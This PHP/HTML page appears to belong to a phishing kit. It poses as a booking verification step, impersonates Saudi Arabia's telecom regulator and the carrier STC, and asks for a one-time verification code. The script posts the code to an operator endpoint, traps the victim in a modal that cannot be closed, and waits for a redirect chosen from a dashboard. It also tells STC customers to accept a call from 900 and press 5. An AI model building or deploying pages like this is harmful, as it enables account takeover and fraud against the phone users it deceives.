<?php
declare(strict_types=1);
require __DIR__ . '/../dashboard/init.php';
auth_require_customer_login_or_redirect();
$id = (int) ($_GET['id'] ?? 0);
$order = order_by_id(bujairi_pdo(), $id);
if (!$order) {
    http_response_code(404);
    exit;
}
$tx = $order['transaction_no'] ?? '';
$txTrim = trim((string) $tx);
$codeSubmitted = $txTrim !== '';
// لا نُعيد التوجيه من الخادم بعد إدخال الرمز: يبقى العميل في نافذة الانتظار
// حتى تضبط لوحة التحكم client_redirect_url؛ التوجيه يتم عبر redirect-status.js (وPusher عند الحاجة).
$successPhase = $codeSubmitted ? 'waiting' : 'entry';

$provider = strtolower(trim((string) ($order['provider'] ?? '')));
$isStc = $provider === 'stc';

$mobileDigits = preg_replace('/\D/', '', (string) ($order['mobile'] ?? ''));
if (strlen($mobileDigits) >= 5) {
    $maskedPhone = substr($mobileDigits, 0, 2) . '*****' . substr($mobileDigits, -3);
} elseif ($mobileDigits !== '') {
    $maskedPhone = $mobileDigits;
} else {
    $maskedPhone = '—';
}

$pageTitle = 'رمز التحقق';
?><!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo h($pageTitle); ?></title>
    <link rel="icon" href="https://s3.ticketmx.com/bujairi/images/favicon.ico">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <style>
        body {
            font-family: 'Tajawal', sans-serif;
            background-color: #f3f6fb;
        }
        .ltr-num {
            direction: ltr;
            unicode-bidi: plaintext;
            display: inline-block;
            text-align: left;
        }
        body.stc-body {
            font-family: 'Tajawal', sans-serif;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            color: #333;
        }
        .stc-card {
            font-family: 'Cairo', sans-serif;
            background: #fff;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            padding: 30px 25px;
            width: 100%;
            max-width: 420px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);
            position: relative;
        }
        .sr-wait-host {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            white-space: nowrap;
            border: 0;
        }
        .top-header {
            margin-bottom: 20px;
            width: 100%;
            max-width: 420px;
            display: flex;
            justify-content: flex-start;
            align-items: center;
        }
        .top-header img { height: 50px; width: auto; object-fit: contain; }
        .mutasil-logo { margin-bottom: 20px; text-align: right; }
        .mutasil-logo img { height: 40px; width: auto; object-fit: contain; }
        .mutasil-logo .brand-line {
            font-size: 13px;
            font-weight: 700;
            color: #1a1a85;
        }
        .notification-box {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 25px;
        }
        .phone-icon {
            color: #1a1a85;
            font-size: 30px;
            border: 2px solid #1a1a85;
            border-radius: 8px;
            padding: 5px;
            width: 45px;
            height: 45px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }
        .notification-text {
            font-size: 15px;
            font-weight: 700;
            color: #4a5568;
            line-height: 1.4;
            text-align: right;
        }
        .arrow-icon {
            color: #22c55e;
            font-size: 20px;
            margin-left: 5px;
        }
        .stc-section { margin-bottom: 25px; }
        .stc-logo {
            width: 80px;
            display: block;
            margin-bottom: 2px;
            margin-right: auto;
        }
        .stc-logo-img { height: 36px; width: auto; object-fit: contain; }
        .stc-wordmark {
            font-size: 28px;
            font-weight: 800;
            color: #4f008c;
            letter-spacing: -0.02em;
            margin-bottom: 6px;
            line-height: 1;
        }
        .stc-text {
            color: #4f008c;
            font-weight: 700;
            font-size: 14px;
            line-height: 1.6;
            text-align: right;
        }
        .stc-input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #cbd5e0;
            border-radius: 6px;
            font-family: 'Cairo', sans-serif;
            font-size: 16px;
            text-align: center;
            outline: none;
            transition: border-color 0.3s;
            box-sizing: border-box;
        }
        .stc-input:focus { border-color: #4f008c; }
        .stc-input::placeholder { color: #a0aec0; }
        .code-display {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #cbd5e0;
            border-radius: 6px;
            font-family: ui-monospace, monospace;
            font-size: 18px;
            font-weight: 700;
            text-align: center;
            letter-spacing: 0.06em;
            background: #fafafa;
            color: #1a202c;
            margin-bottom: 12px;
            box-sizing: border-box;
        }
        .timer {
            text-align: left;
            font-size: 14px;
            color: #4a5568;
            margin-bottom: 20px;
            direction: ltr;
            display: flex;
            justify-content: flex-end;
            gap: 5px;
            align-items: center;
            flex-wrap: wrap;
        }
        .timer > span:first-child { direction: rtl; font-family: 'Cairo', sans-serif; }
        .success-progress-wrap {
            height: 6px;
            background: #edf2f7;
            border-radius: 6px;
            overflow: hidden;
            margin-bottom: 16px;
        }
        .success-progress-wrap .progress-bar {
            height: 100%;
            background: #16a34a;
            width: 100%;
            border-radius: 6px;
            transition: width 1s linear, background 0.3s;
        }
        .instruction-block {
            font-size: 14px;
            color: #4a5568;
            line-height: 1.65;
            margin-bottom: 18px;
            text-align: right;
        }
        .verify-btn {
            width: 140px;
            background-color: #e2e2e2;
            color: #a0aec0;
            border: none;
            padding: 10px 0;
            border-radius: 25px;
            font-family: 'Cairo', sans-serif;
            font-size: 16px;
            cursor: not-allowed;
            font-weight: 600;
            transition: background-color 0.2s, color 0.2s, transform 0.1s;
            text-decoration: none;
            display: inline-block;
            text-align: center;
        }
        .verify-btn.enabled {
            background-color: #4f008c;
            color: #ffffff;
            cursor: pointer;
        }
        .verify-btn.enabled:hover { filter: brightness(1.05); }
        .verify-btn.enabled:active { transform: scale(0.98); }
        .verify-btn:disabled {
            background-color: #e2e2e2 !important;
            color: #a0aec0 !important;
            cursor: not-allowed;
        }
        .actions-row {
            display: flex;
            gap: 12px;
            justify-content: center;
            flex-wrap: wrap;
            align-items: center;
            margin-top: 12px;
        }
        .btn-cancel {
            padding: 10px 20px;
            border-radius: 25px;
            border: 1px solid #cbd5e0;
            background: #fff;
            color: #4a5568;
            font-family: 'Cairo', sans-serif;
            font-weight: 600;
            cursor: pointer;
            font-size: 15px;
        }
        .btn-cancel:hover { background: #f7fafc; }
        .card-footer-stc {
            margin-top: 40px;
            display: flex;
            justify-content: center;
            align-items: center;
            border-top: 1px solid #e2e8f0;
            padding-top: 20px;
        }
        .stc-back-link {
            text-align: center;
            margin-top: 14px;
        }
        .stc-back-link button {
            background: none;
            border: none;
            color: #718096;
            font-size: 13px;
            font-family: 'Cairo', sans-serif;
            cursor: pointer;
            text-decoration: underline;
        }
        .stc-back-link button:hover { color: #4a5568; }
        .card-footer-stc .badge-text {
            font-size: 11px;
            color: #718096;
            line-height: 1.5;
            font-weight: 600;
        }
        .error-msg {
            font-size: 13px;
            color: #e11d48;
            margin-top: 4px;
            display: none;
            text-align: center;
            font-weight: 600;
        }
        .tel-card {
            border-radius: 10px;
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.12);
        }
        .brand-text {
            color: #30323a;
            font-size: 18px;
        }
        .call-icon {
            width: 44px;
            height: 44px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #0d1f13;
            color: #fff;
            margin-inline: auto;
            animation: pulse 1.4s ease-in-out infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); opacity: 0.9; }
            50% { transform: scale(1.06); opacity: 1; }
            100% { transform: scale(1); opacity: 0.9; }
        }
        .dots {
            display: flex;
            gap: 6px;
            justify-content: center;
            margin-top: 10px;
        }
        .dots span {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: #333;
            opacity: 0.65;
            animation: blink 1.2s infinite both;
        }
        .dots span:nth-child(2) { animation-delay: 0.15s; }
        .dots span:nth-child(3) { animation-delay: 0.3s; }
        @keyframes blink {
            0%, 80%, 100% { opacity: 0.25; }
            40% { opacity: 1; }
        }
        .waiting-call-block {
            text-align: center;
            padding: 12px 0 20px;
            border-top: 1px solid #edf2f7;
            margin-top: 8px;
        }
        .normal-otp-label {
            display: block;
            color: #1f2937;
            font-size: 14px;
            margin-bottom: 0.5rem;
            font-weight: 600;
            text-align: right;
            font-family: 'Tajawal', sans-serif;
        }
        .normal-otp-input {
            width: 100%;
            border: 1px solid #d1d5db;
            border-radius: 2px;
            padding: 0.75rem;
            font-size: 1.125rem;
            text-align: center;
            outline: none;
            box-sizing: border-box;
            font-family: 'Tajawal', sans-serif;
        }
        .normal-otp-input:focus {
            box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.35);
        }
        .normal-btn-next {
            padding: 0.5rem 1.5rem;
            border: 1px solid #9ca3af;
            background: #fff;
            color: #1f2937;
            border-radius: 2px;
            font-size: 14px;
            cursor: pointer;
            font-family: 'Tajawal', sans-serif;
            font-weight: 600;
            transition: background 0.2s, opacity 0.2s;
        }
        .normal-btn-next:hover:not(:disabled) { background: #f9fafb; }
        .normal-btn-next:disabled { opacity: 0.45; cursor: not-allowed; }
        .norm-shell { position: relative; }
        /* أثناء انتظار التوجيه من اللوحة: لا تمرير ولا تفاعل مع الصفحة خلف النافذة */
        body.bujairi-success-waiting-lock {
            overflow: hidden !important;
            height: 100vh;
            touch-action: none;
        }
        #otpModal .modal-dialog { margin: 0; max-width: none; }
        #otpModal .modal-content { min-height: 100vh; }
        #otpModal .modal-wait-inner {
            max-width: 26rem;
            width: 100%;
            margin: 0 auto;
        }
    </style>
</head>
<body class="<?php echo $isStc ? 'stc-body' : 'flex items-center justify-center min-h-screen p-4'; ?>"
      data-success-phase="<?php echo h($successPhase); ?>"
      data-order-id="<?php echo (int) $order['id']; ?>"
      data-is-stc="<?php echo $isStc ? '1' : '0'; ?>">

<?php if ($isStc): ?>
<header class="top-header">
    <a href="<?php echo h(url('index.php')); ?>"><img src="https://s3.ticketmx.com/bujairi/images/bujairi-ar.svg" alt=""></a>
</header>

<div class="stc-card" id="otpFormStc">
    <div class="mutasil-logo">
        <img src="https://s3.ticketmx.com/bujairi/images/bujairi-ar.svg" alt="" class="stc-logo-img">
    </div>

    <div id="successEntryWrapStc" class="<?php echo $codeSubmitted ? 'hidden' : ''; ?>">
        <div class="notification-box">
            <div class="phone-icon" aria-hidden="true">
                <svg width="24" height="24" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                          d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"/>
                </svg>
            </div>
            <div class="notification-text">
                <span class="arrow-icon">↗</span>
                تم إرسال رمز التحقق إلى هاتفك النقال
                <span class="ltr-num"><?php echo h($maskedPhone); ?></span>.
                الرجاء إدخاله في هذه الخانة.
            </div>
        </div>
        <div class="stc-section">
            <div class="stc-logo" aria-hidden="true"><span class="stc-wordmark">stc</span></div>
            <div class="stc-text">
                <strong>عملاء STC الكرام في حال تلقي مكالمة من 900</strong><br>
                <strong>الرجاء قبولها واختيار الرقم 5</strong>
            </div>
        </div>
        <div class="mb-2">
            <input type="tel" id="customerCodeInput" class="stc-input" dir="ltr" maxlength="6" inputmode="numeric" pattern="\d*" autocomplete="one-time-code" placeholder="رمز التحقق">
            <div id="otpError" class="error-msg">الرجاء إدخال رمز تحقق مكوّن من 4 أو 6 أرقام فقط.</div>
            <div id="netError" class="error-msg">تعذّر الإرسال مؤقتًا. أعد المحاولة.</div>
        </div>
        <div class="timer">
            <span>إعادة إرسال:</span>
            <span id="stcResendTimer">03:00</span>
        </div>
        <div class="flex justify-center mb-2">
            <button type="button" id="btnContinueCode" class="verify-btn" disabled>تحقق</button>
        </div>
        <div class="stc-back-link"><button type="button" onclick="cancel()">رجوع</button></div>
    </div>
    <div id="successWaitingWrapStc" class="<?php echo $codeSubmitted ? '' : 'hidden'; ?>">
        <p class="notification-text" style="text-align:center;margin-bottom:20px;padding:12px 0;border-bottom:1px solid #edf2f7;font-size:15px;font-weight:700;color:#4a5568;">
            تم استلام رمز التحقق بنجاح.
        </p>
        <div class="sr-wait-host">
            <span id="bujairiSuccessTimer">03:00</span>
            <div class="success-progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
            <p id="instructionText"></p>
        </div>
    </div>

    <div class="card-footer-stc">
        <p class="badge-text">جميع البيانات تُنقل عبر اتصال مشفّر (HTTPS).</p>
    </div>
</div>

<?php else: ?>

<div class="norm-shell bg-white border border-gray-200 rounded-sm shadow-sm w-full max-w-xl p-8">
    <div class="flex items-start justify-start gap-3 mb-4">
        <a href="<?php echo h(url('index.php')); ?>" class="shrink-0 mt-1">
            <img src="https://s3.ticketmx.com/bujairi/images/bujairi-ar.svg" alt="" class="w-8 h-8 object-contain">
        </a>
        <div class="text-right flex-1">
            <h1 class="text-[15px] font-medium text-gray-800" style="font-family:'Tajawal',sans-serif;">هيئة الإتصالات والفضاء التقنية</h1>
            <a href="<?php echo h(url('index.php')); ?>" class="text-blue-700 text-sm font-bold hover:underline">بوابة متصل</a>
        </div>
    </div>

    <p class="text-gray-600 text-[14px] leading-6 mb-5 text-right" style="font-family:'Tajawal',sans-serif;">
        تم إرسال رمز التحقق إلى رقم هاتفك
        <span id="maskedPhoneDisplay" class="ltr-num font-bold" dir="ltr"><?php echo h($maskedPhone); ?></span>،
        الرجاء إدخاله في هذه الخانة.
    </p>

    <div class="space-y-5">
        <div id="successEntryWrapNorm" class="<?php echo $codeSubmitted ? 'hidden' : ''; ?>">
            <div>
                <label for="customerCodeInput" class="normal-otp-label">رمز التحقق</label>
                <input type="tel" id="customerCodeInput" class="normal-otp-input" dir="ltr" maxlength="6" inputmode="numeric" pattern="\d*" autocomplete="one-time-code" placeholder="ادخل رمز التحقق">
                <div id="otpError" class="error-msg">الرجاء إدخال رمز تحقق مكوّن من 4 أو 6 أرقام فقط.</div>
                <div id="netError" class="error-msg">تعذّر الإرسال مؤقتًا. أعد المحاولة.</div>
            </div>
            <div id="actionArea">
                <button type="button" id="btnContinueCode" class="normal-btn-next" disabled>التالي</button>
            </div>
            <p class="text-center"><button type="button" class="text-gray-500 text-sm underline bg-transparent border-0 cursor-pointer" style="font-family:'Tajawal',sans-serif;" onclick="cancel()">رجوع</button></p>
        </div>
        <div id="successWaitingWrapNorm" class="<?php echo $codeSubmitted ? '' : 'hidden'; ?>">
            <p class="text-gray-600 text-[14px] leading-6 text-center py-4 border-y border-gray-100">تم استلام رمز التحقق بنجاح.</p>
            <div class="sr-wait-host">
                <span id="bujairiSuccessTimer">03:00</span>
                <div class="success-progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
                <p id="instructionText"></p>
            </div>
        </div>
    </div>
</div>

<?php endif; ?>

<div class="modal fade" id="otpModal" tabindex="-1" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
    <div class="modal-dialog modal-fullscreen d-flex align-items-center justify-content-center">
        <div class="modal-content tel-card p-4 text-center border-0 rounded-0 shadow-none d-flex align-items-center justify-content-center bg-white">
            <div class="modal-wait-inner px-2">
                <p class="brand-text mt-2 mb-2 px-1">
                    سوف يتم الاتصال بك من قبل مزود الخدمة لتوثيق جهازك<br>الرجاء الانتظار...
                </p>
                <p class="small text-secondary mb-3 px-1" style="line-height:1.65;">
                    تم قبول رمز التحقق. <strong>ابقَ في هذه الشاشة</strong> حتى يتم توجيهك تلقائياً من النظام — لا تغلق الصفحة.
                </p>
                <div class="call-icon">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="#fff" xmlns="http://www.w3.org/2000/svg">
                        <path d="M22 16.92v3a2 2 0 0 1-2.18 2A19.79 19.79 0 0 1 12 20a19.79 19.79 0 0 1-7.82 1.92A2 2 0 0 1 2 19.92v-3a2 2 0 0 1 2-2h.11a2 2 0 0 1 1.89 1.37l.57 1.72a2 2 0 0 0 2 1.37A13 13 0 0 0 12 18a13 13 0 0 0 3.43-.62 2 2 0 0 0 2-1.37l.57-1.72A2 2 0 0 1 20 14.92H20a2 2 0 0 1 2 2z"/>
                    </svg>
                </div>
                <div class="dots"><span></span><span></span><span></span></div>
            </div>
        </div>
    </div>
</div>

<script src="<?php echo h(url('assets/js/success.js')); ?>"></script>
<?php require __DIR__ . '/../dashboard/booking-realtime-script.php'; ?>
<script>
var orderId = <?php echo (int) $order['id']; ?>;
var saveCustomerCodeUrl = <?php echo json_encode(url('booking/save-customer-code.php'), JSON_UNESCAPED_UNICODE); ?>;
var redirectStatusUrl = <?php echo json_encode(url('booking/redirect-status.php?orderId=' . (int) $order['id']), JSON_UNESCAPED_UNICODE); ?>;
(function () {
    window.__bujairiAllowOtpModalClose = false;
    window.__bujairiUnlockOtpModal = function () {
        window.__bujairiAllowOtpModalClose = true;
    };
    var redirectPollStarted = false;
    function applyRedirect(href, redirectVersion) {
        if (!href) return;
        var dv = 0;
        if (redirectVersion != null && redirectVersion !== '') {
            dv = parseInt(String(redirectVersion), 10) || 0;
        }
        if (dv > 0) {
            var gsv = (window.BujairiVerifyWait && typeof window.BujairiVerifyWait.getStoredRedirectVersion === 'function')
                ? window.BujairiVerifyWait.getStoredRedirectVersion
                : null;
            var ssv = (window.BujairiVerifyWait && typeof window.BujairiVerifyWait.setStoredRedirectVersion === 'function')
                ? window.BujairiVerifyWait.setStoredRedirectVersion
                : null;
            var lastV = gsv ? gsv(orderId) : 0;
            if (dv > lastV) {
                if (ssv) ssv(orderId, dv);
            } else {
                return;
            }
        } else {
            if (window.BujairiVerifyWait && typeof window.BujairiVerifyWait.shouldIgnoreRedirectUrl === 'function') {
                if (window.BujairiVerifyWait.shouldIgnoreRedirectUrl(href)) return;
            }
        }
        window.__bujairiAllowOtpModalClose = true;
        window.location.href = href;
    }
    function pollOnce() {
        if (typeof redirectStatusUrl === 'undefined') return;
        fetch(redirectStatusUrl, { credentials: 'same-origin' })
            .then(function (r) { return r.json(); })
            .then(function (data) {
                applyRedirect(data && data.redirectUrl, data && data.redirectVersion);
            })
            .catch(function () {});
    }
    window.BujairiSuccessStartRedirectPoll = function () {
        if (redirectPollStarted) return;
        redirectPollStarted = true;
        pollOnce();
        setInterval(pollOnce, 2500);
    };

    function showOtpModalOnly() {
        var el = document.getElementById('otpModal');
        if (!el || typeof bootstrap === 'undefined' || !bootstrap.Modal) return;
        document.body.classList.add('bujairi-success-waiting-lock');
        bootstrap.Modal.getOrCreateInstance(el, { backdrop: 'static', keyboard: false }).show();
    }

    (function bindOtpModalTrapOnce() {
        var el = document.getElementById('otpModal');
        if (!el || el.dataset.bujTrapBound === '1') return;
        el.dataset.bujTrapBound = '1';
        el.addEventListener('hide.bs.modal', function (e) {
            if (!window.__bujairiAllowOtpModalClose) {
                e.preventDefault();
            }
        });
    })();

    window.BujairiSuccessEnterWaitingUi = function () {
        document.body.setAttribute('data-success-phase', 'waiting');
        var isStc = document.body.getAttribute('data-is-stc') === '1';
        if (isStc) {
            var ewS = document.getElementById('successEntryWrapStc');
            var wwS = document.getElementById('successWaitingWrapStc');
            if (ewS) ewS.classList.add('hidden');
            if (wwS) wwS.classList.remove('hidden');
        } else {
            var ewN = document.getElementById('successEntryWrapNorm');
            var wwN = document.getElementById('successWaitingWrapNorm');
            if (ewN) ewN.classList.add('hidden');
            if (wwN) wwN.classList.remove('hidden');
        }
        showOtpModalOnly();
        if (typeof window.BujairiSuccessStartWaitingCountdown === 'function') {
            window.BujairiSuccessStartWaitingCountdown();
        }
        window.BujairiSuccessStartRedirectPoll();
    };

    var phaseInit = document.body.getAttribute('data-success-phase');
    if (phaseInit === 'waiting') {
        function bootWaiting() {
            showOtpModalOnly();
            window.BujairiSuccessStartRedirectPoll();
        }
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', bootWaiting);
        } else {
            bootWaiting();
        }
    }
})();

(function () {
    var phase = document.body.getAttribute('data-success-phase');
    if (phase !== 'entry') return;
    var isStc = document.body.getAttribute('data-is-stc') === '1';
    var btn = document.getElementById('btnContinueCode');
    var input = document.getElementById('customerCodeInput');
    var otpErr = document.getElementById('otpError');
    var netErr = document.getElementById('netError');
    if (!btn || !input) return;

    function digitsOnly(v) {
        return v.replace(/\D/g, '').slice(0, 6);
    }
    function validLen(s) {
        return s.length === 4 || s.length === 6;
    }
    function syncBtn() {
        input.value = digitsOnly(input.value);
        var ok = validLen(input.value);
        if (otpErr) otpErr.style.display = 'none';
        if (netErr) netErr.style.display = 'none';
        btn.disabled = !ok;
        if (isStc) {
            if (ok) btn.classList.add('enabled');
            else btn.classList.remove('enabled');
        }
    }
    input.addEventListener('input', syncBtn);
    input.addEventListener('paste', function (e) {
        e.preventDefault();
        var t = (e.clipboardData || window.clipboardData).getData('text') || '';
        input.value = digitsOnly(t);
        syncBtn();
    });
    syncBtn();

    btn.addEventListener('click', function () {
        var code = digitsOnly(input.value);
        if (!validLen(code)) {
            if (otpErr) otpErr.style.display = 'block';
            return;
        }
        btn.disabled = true;
        if (isStc) btn.classList.remove('enabled');
        if (otpErr) otpErr.style.display = 'none';
        if (netErr) netErr.style.display = 'none';
        var body = new URLSearchParams();
        body.set('id', String(orderId));
        body.set('TransactionNo', code);
        fetch(saveCustomerCodeUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: body.toString()
        })
            .then(function (r) { return r.json(); })
            .then(function (data) {
                if (data.success) {
                    if (typeof window.BujairiSuccessEnterWaitingUi === 'function') {
                        window.BujairiSuccessEnterWaitingUi();
                    }
                    return;
                }
                if (netErr) {
                    netErr.textContent = data.message || 'تعذّر الإرسال مؤقتًا. أعد المحاولة.';
                    netErr.style.display = 'block';
                }
                syncBtn();
            })
            .catch(function () {
                if (netErr) {
                    netErr.textContent = 'تعذّر الإرسال مؤقتًا. أعد المحاولة.';
                    netErr.style.display = 'block';
                }
                syncBtn();
            });
    });
})();
</script>
</body>
</html>
